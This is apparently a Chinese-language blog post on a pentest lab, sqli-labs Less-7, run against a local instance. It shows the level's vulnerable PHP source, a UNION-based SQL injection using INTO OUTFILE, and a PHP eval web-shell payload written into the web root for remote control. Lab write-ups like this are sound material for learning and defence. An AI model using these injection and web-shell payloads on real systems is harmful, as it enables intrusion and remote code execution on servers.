---
layout: post
title:  "0x03 mysql向外写shell"
date:   2020-04-14 16：44
categories: [pentest]
tags: sqli-labs
---
sqli-labs less7
<!-- more -->

## 文件读取

> sql读写文件读取条件：
>
> 1. 有权限并且文件完全可读
>
>    `and (select conut(*) from mysql.user)>0/*`如果返回正常，则具有读写权限
>
> 2. 文件在服务器上
>
> 3. 指定文件的绝对路径
>
> 4. 读取文件必须小于 max_allowed_packet
>
> 常用函数：
>
> * load_file('file_name') 读取文件并返回该文件的内容作为一个字符
> * load data infile 'filename' 高速地从文本文件中读取行，并装入表中
> * slect ... into outfile 'filename' 将被选择地行写入文件中

### less7

url

```mysql
http://127.0.0.1:9999/Less-7/?id=1'
```

报错信息

```mysql
You have an error in your SQL syntax
```

发现数据库的报错信息并没有显示在前端上，该关卡又提示我们使用outfile

查看这关的源码

```php
$sql="SELECT * FROM users WHERE id=(('$id')) LIMIT 0,1";
$result=mysql_query($sql);
$row = mysql_fetch_array($result);

	if($row)
	{
  	echo '<font color= "#FFFF00">';	
  	echo 'You are in.... Use outfile......';
  	echo "<br>";
  	echo "</font>";
  	}
	else 
	{
	echo '<font color= "#FFFF00">';
	echo 'You have an error in your SQL syntax';
	//print_r(mysql_error());
	echo "</font>";  
	}
}
	else { echo "Please input the ID as parameter with numeric value";}
```

按照教程到向外写文件时发现怎么都写不进去

```sql
http://127.0.0.1:9999/Less-7/?id=1%27))%20UNION%20SELECT%201,2,3%20into%20outfile%20%27/var/www/html/Less-7/1.txt%27%23
```

在数据库里面尝试写文件时报错

```mysql
mysql> select 1,2,(select @@version) into outfile '/var/www/html/Less-7/1.txt';
ERROR 1 (HY000): Can't create/write to file '/var/www/html/Less-7/1.txt' (Errcode: 13)
```

是因为www-data没有权限向/var/www写文件，所以直接改less-7权限就可以了

```bash
chmod -R 777 /vat/www/html/Less-7
```

然后就直接写shell

```mysql
http://127.0.0.1:9999/Less-7/?id=1')) union select 1,2,'<?php @eval($_POST[pass]);?>' into outfile '/var/www/html/Less-7/6.php' %23
```

然后用菜刀连接就可以了